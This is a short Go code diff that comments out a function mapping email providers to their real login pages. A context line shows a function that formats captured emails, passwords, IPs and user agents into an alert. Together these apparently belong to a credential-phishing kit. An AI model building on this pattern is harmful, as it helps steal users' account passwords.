@@ -98,28 +98,28 @@ func FormatLoginAlert(email, password, ip, userAgent string) string {
 	return alert
 }
 
-func GetTargetDomain(email string) string {
-	emailLower := strings.ToLower(email)
+// func GetTargetDomain(email string) string {
+// 	emailLower := strings.ToLower(email)
 
-	switch {
-	case strings.HasSuffix(emailLower, "@hotmail.com"),
-		strings.HasSuffix(emailLower, "@live.com"),
-		strings.HasSuffix(emailLower, "@outlook.com"):
-		return "https://login.microsoftonline.com"
-	case strings.HasSuffix(emailLower, "@163.com"),
-		strings.HasSuffix(emailLower, "@126.com"),
-		strings.HasSuffix(emailLower, "@yeah.net"):
-		return "https://mail.126.com"
-	case strings.HasSuffix(emailLower, "@qq.com"),
-		strings.HasSuffix(emailLower, "@foxmail.com"):
-		return "https://mail.qq.com"
-	case strings.HasSuffix(emailLower, "@gmail.com"):
-		return "https://accounts.google.com"
-	case strings.HasSuffix(emailLower, "@yahoo.com"):
-		return "https://login.yahoo.com"
-	case strings.HasSuffix(emailLower, "@aol.com"):
-		return "https://login.aol.com"
-	default:
-		return "https://login.microsoftonline.com"
-	}
-}
+// 	switch {
+// 	case strings.HasSuffix(emailLower, "@hotmail.com"),
+// 		strings.HasSuffix(emailLower, "@live.com"),
+// 		strings.HasSuffix(emailLower, "@outlook.com"):
+// 		return "https://login.microsoftonline.com"
+// 	case strings.HasSuffix(emailLower, "@163.com"),
+// 		strings.HasSuffix(emailLower, "@126.com"),
+// 		strings.HasSuffix(emailLower, "@yeah.net"):
+// 		return "https://mail.126.com"
+// 	case strings.HasSuffix(emailLower, "@qq.com"),
+// 		strings.HasSuffix(emailLower, "@foxmail.com"):
+// 		return "https://mail.qq.com"
+// 	case strings.HasSuffix(emailLower, "@gmail.com"):
+// 		return "https://accounts.google.com"
+// 	case strings.HasSuffix(emailLower, "@yahoo.com"):
+// 		return "https://login.yahoo.com"
+// 	case strings.HasSuffix(emailLower, "@aol.com"):
+// 		return "https://login.aol.com"
+// 	default:
+// 		return "https://login.microsoftonline.com"
+// 	}
+// }
